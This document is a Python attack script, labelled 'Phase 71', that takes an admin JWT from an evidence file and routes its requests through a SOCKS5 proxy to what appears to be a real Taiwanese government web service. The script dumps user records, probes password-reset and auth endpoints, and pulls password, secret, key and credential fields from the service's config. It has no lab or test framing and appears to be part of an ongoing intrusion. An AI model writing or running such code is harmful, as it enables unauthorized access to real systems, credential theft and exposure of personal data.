#!/usr/bin/env python3
"""Phase 71: Search for password-related fields in API responses."""
import requests, urllib3, json
urllib3.disable_warnings()

PROXY = {"http": "socks5://202.160.76.154:11085", "https": "socks5://202.160.76.154:11085"}

with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/jwt_admin_full.txt', 'r') as f:
    TOKEN = f.read().strip()

BASE = "https://epcr.tpf.gov.tw:4004"

def api_get(endpoint):
    url = f"{BASE}{endpoint}?token={TOKEN}"
    r = requests.get(url, proxies=PROXY, verify=False, timeout=60,
        headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
    return r.status_code, r.text

# Check Users response for any password/secret fields
print("=== Full /Users response keys ===")
status, body = api_get('/Users')
if status == 200:
    users = json.loads(body)
    print(f"Status: {status}, Users: {len(users)}")
    if users:
        print(f"\nFirst user raw data:")
        print(json.dumps(users[0], indent=2, ensure_ascii=False))

# Check if there are admin-only endpoints for password reset/view
print("\n=== Trying password-related endpoints ===")
endpoints = [
    '/Users/resetPassword/',
    '/Users/changePassword',
    '/config',
    '/Auth',
    '/Auth/password',
    '/Auth/secret',
]
for ep in endpoints:
    status, body = api_get(ep)
    print(f"  GET {ep}: {status}, len={len(body)}")
    if status == 200:
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                print(f"    Keys: {list(data.keys())}")
        except:
            print(f"    Body: {body[:100]}")

# Check config for password-related fields
print("\n=== Config password/secret fields ===")
status, body = api_get('/config')
if status == 200:
    config = json.loads(body)
    for key, val in config.items():
        if any(w in key.lower() for w in ['pass', 'secret', 'key', 'token', 'cred', 'auth']):
            print(f"  {key}: {str(val)[:100]}")
